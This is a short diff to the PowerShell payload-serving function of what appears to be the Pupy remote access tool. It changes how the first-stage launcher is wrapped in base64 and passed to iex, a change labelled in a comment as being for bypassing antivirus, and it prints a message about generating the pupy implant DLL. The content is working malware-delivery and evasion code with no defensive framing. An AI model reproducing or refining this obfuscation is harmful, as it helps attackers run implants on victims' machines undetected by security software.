@@ -142,7 +142,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)
         
         # For bypassing AV
-        stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
+        stage1 = "$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}')))|iex;".format(b64encode(stage1))
         
         # generate both pupy dll to gain time response
         print colorize("Generating puppy dll to gain server reaction time. Be patient...", "red")
